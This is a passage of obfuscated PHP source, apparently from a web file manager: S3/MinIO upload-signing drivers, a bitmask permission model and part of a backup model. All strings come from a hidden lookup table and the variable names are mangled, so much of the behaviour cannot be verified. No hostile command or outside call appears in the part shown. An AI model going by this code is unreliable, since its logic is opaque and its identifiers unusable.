$ÙÀó•°, $Š›ó€±[95] => $Ú¥ôÄ‚Š, $Š›ó€±[256] => $this->signVer); if ($this->_isClientAsync()) { unset($€Êº–³[$Š›ó€±[256]]); } return $€Êº–³; } public function uploadMultiAuth($Â¼¡°™®, $š†êõ–ç = array()) { $Éùù™æ‡ =& $_SERVER[”øäÃÍª]; if ($this->signVer == $Éùù™æ‡[247]) { if (isset($š†êõ–ç[$Éùù™æ‡[283]])) { return $this->uploadPartAuthV2($Â¼¡°™®, $š†êõ–ç); } return $this->uploadListAuthV2($Â¼¡°™®, $š†êõ–ç); } if (isset($š†êõ–ç[$Éùù™æ‡[283]])) { return $this->uploadPartAuthV4($Â¼¡°™®, $š†êõ–ç); } return $this->uploadListAuthV4($Â¼¡°™®, $š†êõ–ç); } public function uploadPartAuthV2($Ö¼ì¾›, $…ßµÅÉš = array()) { $ÔÙÈ¢û“ =& $_SERVER[”øäÃÍª]; $ãªÖšá¦ = $…ßµÅÉš[$ÔÙÈ¢û“[95]]; $å×çĞô  = gmdate($ÔÙÈ¢û“[279]); $é…  = array_intersect_key($…ßµÅÉš, array_flip(array($ÔÙÈ¢û“[283], $ÔÙÈ¢û“[281]))); ksort($é… ); $ñòÚáº¢ = $é…  ? $ÔÙÈ¢û“[76] . http_build_query($é… , null, $ÔÙÈ¢û“[284], PHP_QUERY_RFC3986) : $ÔÙÈ¢û“[12]; $·­îÔøã = array($ÔÙÈ¢û“[253], $ÔÙÈ¢û“[12], $ÔÙÈ¢û“[120], $ÔÙÈ¢û“[12], "\x78\x2d\x61\155\172\55\x64\141\x74\145\x3a{$å×çĞô }", $ÔÙÈ¢û“[8] . $this->bucket . $ÔÙÈ¢û“[8] . $this->pathEncode($ãªÖšá¦) . $ñòÚáº¢); $ì¨´Ì¬† = implode($ÔÙÈ¢û“[285], $·­îÔøã); $£¹‡õª­ = $this->client->__getSignature($ì¨´Ì¬†); return array($ÔÙÈ¢û“[286] => $£¹‡õª­, $ÔÙÈ¢û“[282] => $å×çĞô ); } public function uploadListAuthV2($Ñ„ºÃà¤, $©Á˜ğÙ÷ = array()) { $áõ²Ù‡ =& $_SERVER[”øäÃÍª]; $®·Ü·Ò˜ = $©Á˜ğÙ÷[$áõ²Ù‡[95]]; $å²åöÈä = $©Á˜ğÙ÷[$áõ²Ù‡[281]]; $Şäùçºğ = $this->client->listParts($this->bucket, $®·Ü·Ò˜, $å²åöÈä); if (!$Şäùçºğ) { return !1; } $ƒŞ·Æ§ˆ = gmdate($áõ²Ù‡[279]); $ÓÌôµö = $áõ²Ù‡[287] . $å²åöÈä; $ÙÂõøµü = array($áõ²Ù‡[288], $áõ²Ù‡[12], $áõ²Ù‡[120], $áõ²Ù‡[12], "\170\55\141\155\172\55\x64\x61\x74\145\72{$ƒŞ·Æ§ˆ}", $áõ²Ù‡[8] . $this->bucket . $áõ²Ù‡[8] . $this->pathEncode($®·Ü·Ò˜) . $ÓÌôµö); $–ë‰ìäÇ = implode($áõ²Ù‡[285], $ÙÂõøµü); $…ĞÅ­¨’ = $this->client->__getSignature($–ë‰ìäÇ); return array($áõ²Ù‡[286] => $…ĞÅ­¨’, $áõ²Ù‡[282] => $ƒŞ·Æ§ˆ, $áõ²Ù‡[289] => $Şäùçºğ); } public function uploadPartAuthV4($¦İÇåŞÕ, $­½çØú = array()) { $ °›‘Ç¨ =& $_SERVER[”øäÃÍª]; $÷öÅÈ©… = $­½çØú[$ °›‘Ç¨[95]]; $×ç¬¥ÈÙ = array($ °›‘Ç¨[273] => gmdate($ °›‘Ç¨[280]), $ °›‘Ç¨[290] => _get($­½çØú, $ °›‘Ç¨[291], hash($ °›‘Ç¨[275], $ °›‘Ç¨[12]))); $Ç½ÇÊìÇ = explode($ °›‘Ç¨[208], $this->getHost()); $Ù‡™¥ü¡ = array($ °›‘Ç¨[292] => $Ç½ÇÊìÇ[1], $ °›‘Ç¨[293] => $ °›‘Ç¨[12], $ °›‘Ç¨[246] => $ °›‘Ç¨[120], $ °›‘Ç¨[294] => $­½çØú[$ °›‘Ç¨[79]]); $ƒÀ€üàÁ = $ °›‘Ç¨[253]; $çÀˆÒª = $ °›‘Ç¨[8] . $this->pathEncode($÷öÅÈ©…); $æ¤óÈ÷ = array_intersect_key($­½çØú, array_flip(array($ °›‘Ç¨[283], $ °›‘Ç¨[281]))); $å–ø©æ¹ = $this->client->__getSignatureV4($×ç¬¥ÈÙ, $Ù‡™¥ü¡, $ƒÀ€üàÁ, $çÀˆÒª, $æ¤óÈ÷); return array($ °›‘Ç¨[286] => $å–ø©æ¹, $ °›‘Ç¨[290] => $×ç¬¥ÈÙ[$ °›‘Ç¨[290]], $ °›‘Ç¨[282] => $×ç¬¥ÈÙ[$ °›‘Ç¨[273]]); } public function uploadListAuthV4($Ğ÷Û¾úå, $ÀÀ—‘Œ† = array()) { $ìà¤öÆ‘ =& $_SERVER[”øäÃÍª]; $‚õ†ò§ = $ÀÀ—‘Œ†[$ìà¤öÆ‘[95]]; $¾ÙùĞ‚ = $ÀÀ—‘Œ†[$ìà¤öÆ‘[281]]; $­µŞë† = $this->client->listParts($this->bucket, $‚õ†ò§, $¾ÙùĞ‚); if (!$­µŞë†) { return !1; } $¿”áå²« = $ìà¤öÆ‘[295]; foreach ($­µŞë† as $‚Áëµ¿) { $¿”áå²« .= $ìà¤öÆ‘[296] . "\x3c\120\x61\162\164\x4e\x75\155\142\x65\x72\x3e{$‚Áëµ¿[$ìà¤öÆ‘[297]]}\74\x2f\x50\x61\x72\x74\x4e\x75\155\142\x65\x72\76\12" . "\74\105\124\x61\x67\x3e{$‚Áëµ¿[$ìà¤öÆ‘[298]]}\74\x2f\x45\x54\x61\x67\76\12" . $ìà¤öÆ‘[299]; } $¿”áå²« .= $ìà¤öÆ‘[300]; $ˆƒŞ¸óĞ = array($ìà¤öÆ‘[273] => gmdate($ìà¤öÆ‘[280]), $ìà¤öÆ‘[290] => hash($ìà¤öÆ‘[275], $¿”áå²«)); $É„„È˜ = explode($ìà¤öÆ‘[208], $this->getHost()); $¶ÑÍ¸•Á = array($ìà¤öÆ‘[292] => $É„„È˜[1], $ìà¤öÆ‘[246] => $ìà¤öÆ‘[120], $ìà¤öÆ‘[294] => strlen($¿”áå²«)); $æ­Ãø°à = $ìà¤öÆ‘[288]; $Ç»•ê„ = $ìà¤öÆ‘[8] . $this->pathEncode($‚õ†ò§); $¹¹ñÙ¾– = array($ìà¤öÆ‘[281] => $¾ÙùĞ‚); $–å‰‘É  = $this->client->__getSignatureV4($ˆƒŞ¸óĞ, $¶ÑÍ¸•Á, $æ­Ãø°à, $Ç»•ê„, $¹¹ñÙ¾–); return array($ìà¤öÆ‘[286] => $–å‰‘É , $ìà¤öÆ‘[290] => $ˆƒŞ¸óĞ[$ìà¤öÆ‘[290]], $ìà¤öÆ‘[282] => $ˆƒŞ¸óĞ[$ìà¤öÆ‘[273]], $ìà¤öÆ‘[289] => $­µŞë†); } private function _isClientAsync() { $æ–¦õà‚ =& $_SERVER[”øäÃÍª]; static $íµÍ—©Ş = null; if ($íµÍ—©Ş === null) { $ıÆê„Ìû = isset($_REQUEST[$æ–¦õà‚[301]]) ? json_decode($_REQUEST[$æ–¦õà‚[301]], !0) : !1; $íµÍ—©Ş = $ıÆê„Ìû && _get($ıÆê„Ìû, $æ–¦õà‚[302]) == $æ–¦õà‚[303]; } return $íµÍ—©Ş; } public function getHost() { $öÏĞîı‡ =& $_SERVER[”øäÃÍª]; $Ñèû¸Õ‡ = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($öÏĞîı‡[70], $öÏĞîı‡[64], $öÏĞîı‡[69], $öÏĞîı‡[62]))) { return $Ñèû¸Õ‡ . $öÏĞîı‡[8] . $this->bucket; } if ($this->osType == $öÏĞîı‡[62] && !is_domain($Ñèû¸Õ‡)) { return $Ñèû¸Õ‡ . $öÏĞîı‡[8] . $this->bucket; } $Ñèû¸Õ‡ = explode($öÏĞîı‡[208], $Ñèû¸Õ‡); return $Ñèû¸Õ‡[0] . $öÏĞîı‡[208] . $this->bucket . $öÏĞîı‡[10] . $Ñèû¸Õ‡[1]; } public function size($ˆÏÄË±ä) { $‹õåò = $this->objectMeta($ˆÏÄË±ä); return $‹õåò ? $‹õåò[$_SERVER[”øäÃÍª][79]] : 0; } public function info($Ôşİ“™) { if ($this->isFolder($Ôşİ“™)) { return $this->folderInfo($Ôşİ“™); } else { if ($this->isFile($Ôşİ“™)) { return $this->fileInfo($Ôşİ“™); } } return !1; } public function exist($ £©”ô×) { return $this->isFile($ £©”ô×) || $this->isFolder($ £©”ô×); } public function isFile($’Ê©Ö‹“) { return !$this->isFolder($’Ê©Ö‹“) && $this->objectMeta($’Ê©Ö‹“); } public function isFolder($øÒ’ì¿) { return $this->cacheMethod($_SERVER[”øäÃÍª][177], $øÒ’ì¿); } protected function objectMeta($ÏÊÌ€ö›) { return $this->cacheMethod($_SERVER[”øäÃÍª][179], $ÏÊÌ€ö›); } protected function _objectMeta($Â¿Àîºì) { $Ã®øØÚê =& $_SERVER[”øäÃÍª]; $Â¿Àîºì = rtrim($Â¿Àîºì, $Ã®øØÚê[8]); try { $’Ñí®éª = $this->client->getObjectInfo($this->bucket, $Â¿Àîºì); if (!isset($’Ñí®éª[$Ã®øØÚê[252]]) && isset($’Ñí®éª[$Ã®øØÚê[304]])) { $’Ñí®éª[$Ã®øØÚê[252]] = $’Ñí®éª[$Ã®øØÚê[304]]; } } catch (Exception $ş²é‰„¾) { $’Ñí®éª = !1; } if (!$’Ñí®éª) { } return $’Ñí®éª; } protected function _isFolder($²ÀĞ€ñÓ) { $¬Ç™ıÃà =& $_SERVER[”øäÃÍª]; $²ÀĞ€ñÓ = rtrim($²ÀĞ€ñÓ, $¬Ç™ıÃà[8]) . $¬Ç™ıÃà[8]; if ($²ÀĞ€ñÓ == $¬Ç™ıÃà[12] || $²ÀĞ€ñÓ == $¬Ç™ıÃà[8]) { return !0; } $«ã¢Áş“ = $this->client->getBucket($this->bucket, $²ÀĞ€ñÓ, null, 1); if (empty($«ã¢Áş“[$¬Ç™ıÃà[236]])) { return !1; } $¯ëî´ = $«ã¢Áş“[$¬Ç™ıÃà[236]][0][$¬Ç™ıÃà[32]]; return stripos($¯ëî´, $²ÀĞ€ñÓ) === 0 ? !0 : !1; if (substr($¯ëî´, -1) == $¬Ç™ıÃà[8]) { return !0; } if (get_path_this($¯ëî´) == get_path_this($²ÀĞ€ñÓ)) { return !1; } return !0; } public function listObject($°ÔÖâ´‹) { return $this->fileList($°ÔÖâ´‹, $_SERVER[”øäÃÍª][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($ìü¼ö”³) { $Òåà¯¶Š =& $_SERVER[”øäÃÍª]; parent::__construct($ìü¼ö”³); $this->setSignVersion($Òåà¯¶Š[247]); if (!$this->region) { $this->region = $Òåà¯¶Š[305]; $this->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function uploadFormData($²ñ¤Ë§”, $¤“‡¸‚÷ = 3600) { $Áã‹§Å =& $_SERVER[”øäÃÍª]; $ÇïÎ÷Úá = $Áã‹§Å[229]; $ÀİÆÑ¥ = $Áã‹§Å[257]; $ËƒÁ™â = $Áã‹§Å[62]; $ÈİÁê¡Â = gmdate($Áã‹§Å[258]); $Îº„·¬… = gmdate($Áã‹§Å[259]); $ø‘ÃÖ³’ = $Áã‹§Å[260]; $Œ¦—ŞÁÔ = $¤“‡¸‚÷ . $Áã‹§Å[12]; $¸éÈ¾³á = $Áã‹§Å[261]; $öÃÜ‚†å = array($this->accessKey, $Îº„·¬…, $this->region, $ËƒÁ™â, $ø‘ÃÖ³’); $¸‹ç÷ÉÌ = implode($Áã‹§Å[8], $öÃÜ‚†å); $É±»’ß¢ = array($Áã‹§Å[262] => gmdate($Áã‹§Å[263], strtotime($Áã‹§Å[264])), $Áã‹§Å[265] => array(array($Áã‹§Å[266] => $this->bucket), array($Áã‹§Å[306] => $ÇïÎ÷Úá), array($Áã‹§Å[267], $Áã‹§Å[268], $Áã‹§Å[12]), array($Áã‹§Å[267], $Áã‹§Å[269], $Áã‹§Å[12]), array($Áã‹§Å[267], $Áã‹§Å[307], $Áã‹§Å[12]), array($Áã‹§Å[270] => $¸éÈ¾³á), array($Áã‹§Å[271] => $¸‹ç÷ÉÌ), array($Áã‹§Å[272] => $ÀİÆÑ¥), array($Áã‹§Å[273] => $ÈİÁê¡Â), array($Áã‹§Å[274] => $Œ¦—ŞÁÔ))); $­òëÎ«º = base64_encode(json_encode($É±»’ß¢)); $è€¹â±ö = hash_hmac($Áã‹§Å[275], $Îº„·¬…, $Áã‹§Å[276] . $this->secret, !0); $Ë¦…¯Š¨ = hash_hmac($Áã‹§Å[275], $this->region, $è€¹â±ö, !0); $Ê½ê¤Ó¸ = hash_hmac($Áã‹§Å[275], $ËƒÁ™â, $Ë¦…¯Š¨, !0); $Õ—ÌÌİ³ = hash_hmac($Áã‹§Å[275], $ø‘ÃÖ³’, $Ê½ê¤Ó¸, !0); $ƒ¢÷„©ß = hash_hmac($Áã‹§Å[275], $­òëÎ«º, $Õ—ÌÌİ³); $óøÑêá— = array($Áã‹§Å[246] => $Áã‹§Å[12], $Áã‹§Å[294] => $Áã‹§Å[12], $Áã‹§Å[306] => $ÇïÎ÷Úá, $Áã‹§Å[270] => $¸éÈ¾³á, $Áã‹§Å[277] => $­òëÎ«º, $Áã‹§Å[308] => $¸‹ç÷ÉÌ, $Áã‹§Å[309] => $ÀİÆÑ¥, $Áã‹§Å[310] => $ÈİÁê¡Â, $Áã‹§Å[311] => $Œ¦—ŞÁÔ, $Áã‹§Å[312] => $ƒ¢÷„©ß, $Áã‹§Å[206] => $this->getHost()); return $óøÑêá—; } } goto Eµ­Ÿˆ¸Ùã; Bª‚ä¦Ì¹©: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $é¼Ïıõ =& $_SERVER[”øäÃÍª]; $İ›ç˜”î = array(array($é¼Ïıõ[517] => LNG($é¼Ïıõ[2141]), $é¼Ïıõ[2142] => $é¼Ïıõ[2143], $é¼Ïıõ[2144] => 1, $é¼Ïıõ[2145] => 1, $é¼Ïıõ[2146] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($é¼Ïıõ[517] => LNG($é¼Ïıõ[2147]), $é¼Ïıõ[2142] => $é¼Ïıõ[2148], $é¼Ïıõ[2144] => 2, $é¼Ïıõ[2145] => 1, $é¼Ïıõ[2146] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($é¼Ïıõ[517] => LNG($é¼Ïıõ[2149]), $é¼Ïıõ[2142] => $é¼Ïıõ[2150], $é¼Ïıõ[2144] => 3, $é¼Ïıõ[2145] => 1, $é¼Ïıõ[2146] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($é¼Ïıõ[517] => LNG($é¼Ïıõ[2151]), $é¼Ïıõ[2142] => $é¼Ïıõ[2152], $é¼Ïıõ[2144] => 4, $é¼Ïıõ[2145] => 1, $é¼Ïıõ[2146] => self::AUTH_SHOW | self::AUTH_VIEW), array($é¼Ïıõ[517] => LNG($é¼Ïıõ[2153]), $é¼Ïıõ[2142] => $é¼Ïıõ[2154], $é¼Ïıõ[2144] => 5, $é¼Ïıõ[2145] => 1, $é¼Ïıõ[2146] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($é¼Ïıõ[517] => LNG($é¼Ïıõ[2155]), $é¼Ïıõ[2142] => $é¼Ïıõ[2156], $é¼Ïıõ[2144] => 6, $é¼Ïıõ[2145] => 1, $é¼Ïıõ[2146] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($é¼Ïıõ[517] => LNG($é¼Ïıõ[2157]), $é¼Ïıõ[2142] => $é¼Ïıõ[2158], $é¼Ïıõ[2144] => 7, $é¼Ïıõ[2145] => 1, $é¼Ïıõ[2146] => 0)); return $İ›ç˜”î; } public static function authCheck($Ç¥„Š¨, $¦ß±ü¯ş, $ğöµ”¿ = true) { $î­Ûˆ§¬ =& $_SERVER[”øäÃÍª]; $Ç¥„Š¨ = intval($Ç¥„Š¨); if ($ğöµ”¿) { if (KodUser::isRoot() && $GLOBALS[$î­Ûˆ§¬[6]][$î­Ûˆ§¬[2159]]) { return !0; } } if ($Ç¥„Š¨ <= 0) { return !1; } if (($Ç¥„Š¨ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Ç¥„Š¨ & $¦ß±ü¯ş); } public static function authCheckShow($¥ÉÄô´) { return self::authCheck($¥ÉÄô´, self::AUTH_SHOW); } public static function authCheckView($¡ÁÆæª¸) { return self::authCheck($¡ÁÆæª¸, self::AUTH_VIEW); } public static function authCheckDownload($ßÈ™ê¨ù) { return self::authCheck($ßÈ™ê¨ù, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ÑíıîëÍ) { return self::authCheck($ÑíıîëÍ, self::AUTH_UPLOAD); } public static function authCheckEdit($À¼¹ÏŸ˜) { return self::authCheck($À¼¹ÏŸ˜, self::AUTH_EDIT); } public static function authCheckRemove($Ğ™Æ¦ÇË) { return self::authCheck($Ğ™Æ¦ÇË, self::AUTH_REMOVE); } public static function authCheckShare($²ÛÊ—ÀÇ) { return self::authCheck($²ÛÊ—ÀÇ, self::AUTH_SHARE); } public static function authCheckComment($çî¬Öæƒ) { return self::authCheck($çî¬Öæƒ, self::AUTH_COMMENT); } public static function authCheckEvent($“úÙú¶•) { return self::authCheck($“úÙú¶•, self::AUTH_EVENT); } public static function authCheckRoot($®ôÈ¢Ÿ˜) { return self::authCheck($®ôÈ¢Ÿ˜, self::AUTH_ROOT); } public static function authCheckAction($Ó±åŸ—, $†ƒÁÍû³) { $©ĞË¥–À =& $_SERVER[”øäÃÍª]; $’ì¯¬…û = array($©ĞË¥–À[1515] => self::AUTH_SHOW, $©ĞË¥–À[1516] => self::AUTH_VIEW, $©ĞË¥–À[1337] => self::AUTH_DOWNLOAD, $©ĞË¥–À[107] => self::AUTH_UPLOAD, $©ĞË¥–À[1517] => self::AUTH_EDIT, $©ĞË¥–À[1286] => self::AUTH_REMOVE, $©ĞË¥–À[1518] => self::AUTH_SHARE, $©ĞË¥–À[429] => self::AUTH_COMMENT, $©ĞË¥–À[1519] => self::AUTH_EVENT, $©ĞË¥–À[1520] => self::AUTH_ROOT); if (!isset($’ì¯¬…û[$†ƒÁÍû³])) { return; } $Şì×šöñ = $’ì¯¬…û[$†ƒÁÍû³]; $Ó±åŸ— = intval($Ó±åŸ—); if ($Ó±åŸ— <= 0) { return !1; } if (($Ó±åŸ— & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Ó±åŸ— & $Şì×šöñ); } public static function authDisable($“ÂëÙğÈ, $–¨ãÅìÅ) { if (intval($“ÂëÙğÈ) <= 0) { return 0; } return intval($“ÂëÙğÈ) & ~$–¨ãÅìÅ; } public $optionType = "\123\x79\x73\164\145\155\x2e\163\157\x75\x72\143\145\101\x75\x74\150\x4c\x69\163\x74"; public $field = array("\x6e\141\x6d\x65", "\x61\x75\x74\x68", "\x6c\x61\x62\145\154", "\x64\151\163\x70\154\x61\x79", "\163\x79\163\164\145\155", "\163\x6f\162\x74"); public function initData() { $—ÇÊ§Ãç = $this->authDefault(); foreach ($—ÇÊ§Ãç as $“ ìÏ™ö) { $this->add($“ ìÏ™ö); } } public function findAuth($Ú”¦ÂÄ×, $±±¢‰à²) { $·Ö–¿ä =& $_SERVER[”øäÃÍª]; $ªë±¹ùò = parent::listData(); foreach ($ªë±¹ùò as $ñõÍÚô) { $úªĞÊÃ› = intval($ñõÍÚô[$·Ö–¿ä[510]]); if ($úªĞÊÃ› <= 0 || $ñõÍÚô[$·Ö–¿ä[2160]] == 0) { continue; } if (($úªĞÊÃ› & $Ú”¦ÂÄ×) != $Ú”¦ÂÄ×) { continue; } if (($úªĞÊÃ› & $±±¢‰à²) != 0) { continue; } return $ñõÍÚô[$·Ö–¿ä[487]]; } return !1; } public function findAuthMax($ı‚¸Ú‡Š, $ú²‹ìŒ) { $Í¶‚Ş½ =& $_SERVER[”øäÃÍª]; $š¿ËĞÄ = !1; $ËÔ­í­ó = parent::listData(); foreach ($ËÔ­í­ó as $˜‘éîš) { $ËÈÎ›èÌ = intval($˜‘éîš[$Í¶‚Ş½[510]]); if ($ËÈÎ›èÌ <= 0 || $˜‘éîš[$Í¶‚Ş½[2160]] == 0) { continue; } if (($ËÈÎ›èÌ & $ı‚¸Ú‡Š) != $ı‚¸Ú‡Š) { continue; } if (($ËÈÎ›èÌ & $ú²‹ìŒ) != 0) { continue; } if (!$š¿ËĞÄ) { $š¿ËĞÄ = $˜‘éîš; continue; } if (intval($š¿ËĞÄ[$Í¶‚Ş½[510]]) < $ËÈÎ›èÌ) { $š¿ËĞÄ = $˜‘éîš; } } return $š¿ËĞÄ ? $š¿ËĞÄ[$Í¶‚Ş½[487]] : !1; } public function findAuthReadOnly() { $£¼º¿‚ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $—ó˜òæƒ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($£¼º¿‚, $—ó˜òæƒ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $Õå˜ÇšÉ =& $_SERVER[”øäÃÍª]; $¹²È»ï¼ = parent::listData(); $–¹¸¸ê¡ = !1; foreach ($¹²È»ï¼ as $ÜôúÇ‚) { if ($ÜôúÇ‚[$Õå˜ÇšÉ[510]] <= 0 || $ÜôúÇ‚[$Õå˜ÇšÉ[2160]] == $Õå˜ÇšÉ[228]) { continue; } if (!$–¹¸¸ê¡) { $–¹¸¸ê¡ = $ÜôúÇ‚; continue; } if ($–¹¸¸ê¡[$Õå˜ÇšÉ[510]] > $ÜôúÇ‚[$Õå˜ÇšÉ[510]]) { $–¹¸¸ê¡ = $ÜôúÇ‚; } } return $–¹¸¸ê¡ ? $–¹¸¸ê¡[$Õå˜ÇšÉ[487]] : $Õå˜ÇšÉ[12]; } public function listData($›Ğ¯ô‰Î = false, $Éôˆ¦´– = "\163\157\x72\164", $…Àã™ÀÏ = false) { return parent::listData($›Ğ¯ô‰Î, $Éôˆ¦´–, $…Àã™ÀÏ); } public function update($˜¿òËÛ, $ÒÕ¬ƒü„) { $ØıÂØà =& $_SERVER[”øäÃÍª]; $ø€øÙàÂ = parent::listData($˜¿òËÛ); $ã•û«Ş¶ = $this->findByName($ÒÕ¬ƒü„[$ØıÂØà[32]]); if (!$ø€øÙàÂ || $ã•û«Ş¶ && $ã•û«Ş¶[$ØıÂØà[487]] != $ø€øÙàÂ[$ØıÂØà[487]]) { return !1; } $this->filterAuth($ÒÕ¬ƒü„[$ØıÂØà[510]]); return parent::update($˜¿òËÛ, $ÒÕ¬ƒü„); } public function remove($äî¶é‹‰) { $æ‰ÈØĞ³ = parent::listData($äî¶é‹‰); if (!$æ‰ÈØĞ³ || $æ‰ÈØĞ³[$_SERVER[”øäÃÍª][189]]) { return !1; } return parent::remove($äî¶é‹‰); } public function add($‘êò­º = array()) { $¡ˆ‰Ãú… =& $_SERVER[”øäÃÍª]; if ($this->findByName($‘êò­º[$¡ˆ‰Ãú…[32]])) { return !1; } $’õ´îË = array($¡ˆ‰Ãú…[32] => $¡ˆ‰Ãú…[12], $¡ˆ‰Ãú…[510] => 1, $¡ˆ‰Ãú…[2161] => $¡ˆ‰Ãú…[2150], $¡ˆ‰Ãú…[2160] => 1, $¡ˆ‰Ãú…[189] => 0, $¡ˆ‰Ãú…[2162] => 0); $‘êò­º = array_merge($’õ´îË, $‘êò­º); $‘êò­º[$¡ˆ‰Ãú…[2162]] = $this->getSort(); $this->filterAuth($‘êò­º[$¡ˆ‰Ãú…[510]]); return parent::insert($‘êò­º); } private function getSort() { $‚Ø¹îœß =& $_SERVER[”øäÃÍª]; $Ñ¹Îº¥« = parent::listData(); $°‚¼¸äÄ = array_to_keyvalue($Ñ¹Îº¥«, $‚Ø¹îœß[12], $‚Ø¹îœß[2162]); return empty($°‚¼¸äÄ) ? 0 : max($°‚¼¸äÄ) + 1; } private function filterAuth(&$ßËŞƒŞ) { if (!$ßËŞƒŞ) { return; } $”ÉÁ¾ñÃ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $í¡°û¶š = array(); foreach ($”ÉÁ¾ñÃ as $ë¹«‰ä¶) { if ($ßËŞƒŞ & $ë¹«‰ä¶) { $í¡°û¶š[] = $ë¹«‰ä¶; } } if (in_array(self::AUTH_ROOT, $í¡°û¶š)) { $ßËŞƒŞ = array_sum($”ÉÁ¾ñÃ); return; } $ˆ¹ÂÙäÛ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($í¡°û¶š as $ë¹«‰ä¶) { if (isset($ˆ¹ÂÙäÛ[$ë¹«‰ä¶])) { $í¡°û¶š = array_merge($í¡°û¶š, $ˆ¹ÂÙäÛ[$ë¹«‰ä¶]); } } $í¡°û¶š[] = self::AUTH_SHOW; $ßËŞƒŞ = array_sum(array_unique($í¡°û¶š)); } public function sort($˜ÊÖÁ‰, $ùª³€‡¼) { return parent::update($˜ÊÖÁ‰, $ùª³€‡¼); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\155\56\x62\x61\x63\153\165\x70\x4c\x69\163\x74"; public $field = array("\151\x6f", "\x6e\141\x6d\x65", "\163\164\141\x74\165\x73", "\x63\157\156\x74\145\x6e\164", "\x6d\x61\x6e\165\x61\x6c", "\162\x65\163\165\154\164", "\164\x69\155\145\x46\x72\x6f\x6d", "\164\x69\155\145\124\x6f"); public function config() { $ú¼ÒĞã£ =& $_SERVER[”øäÃÍª]; Action($ú¼ÒĞã£[2163])->taskInit(); $âúÊÚÔ = Model($ú¼ÒĞã£[882])->get($ú¼ÒĞã£[889]); $âúÊÚÔ = json_decode($âúÊÚÔ, !0); $âúÊÚÔ = is_array($âúÊÚÔ) ? $âúÊÚÔ : array(); $this->parseContent($âúÊÚÔ); unset($âúÊÚÔ[$ú¼ÒĞã£[1904]]); Model($ú¼ÒĞã£[1903])->cacheClear(); $—’òÕ”» = $ú¼ÒĞã£[2164]; $Š…‰ û = Model($ú¼ÒĞã£[2165])->findByKey($ú¼ÒĞã£[1519], $—’òÕ”»); if (!$Š…‰ û) { $Š…‰ û = array(); } if (isset($Š…‰ û[$ú¼ÒĞã£[204]])) { $Š…‰ û[$ú¼ÒĞã£[204]] = json_decode($Š…‰ û[$ú¼ÒĞã£[204]], !0); } if (isset($âúÊÚÔ[$ú¼ÒĞã£[204]])) { $Š…‰ û[$ú¼ÒĞã£[204]][$ú¼ÒĞã£[1907]] = $âúÊÚÔ[$ú¼ÒĞã£[204]]; unset($âúÊÚÔ[$ú¼ÒĞã£[204]]); } return array_merge($Š…‰ û, $âúÊÚÔ); } public function listData($–ø”‹—ì = false, $¤¨¶†­ = "\x6d\x6f\144\x69\146\x79\x54\151\x6d\145", $ªÆà¿ã = false) { $ÜÙÛŠœ = parent::listData($–ø”‹—ì, $¤¨¶†­, !0); if (!$ÜÙÛŠœ) { return $ÜÙÛŠœ; } if ($–ø”‹—ì) { $ÜÙÛŠœ = array($ÜÙÛŠœ); } foreach ($ÜÙÛŠœ as &$Ú¸’ìõŸ) { $this->parseContent($Ú¸’ìõŸ); } return $–ø”‹—ì ? $ÜÙÛŠœ[0] : $ÜÙÛŠœ; } public function parseContent(&$Çû¦Ì¨š) { $—ª«ÁÎ° =& $_SERVER[”øäÃÍª]; $¼˜é¯î = _get($Çû¦Ì¨š, $—ª«ÁÎ°[168], $—ª«ÁÎ°[91]); if (!in_array($¼˜é¯î, array($—ª«ÁÎ°[888], $—ª«ÁÎ°[1260]))) { $Çû¦Ì¨š[$—ª«ÁÎ°[168]] = $¼˜é¯î == $—ª«ÁÎ°[91] ? $—ª«ÁÎ°[1260] : $—ª«ÁÎ°[888]; } } public function lastItem() { $Á´Ü¤Ãµ = $this->listData(); return !empty($Á´Ü¤Ãµ[0]) ? 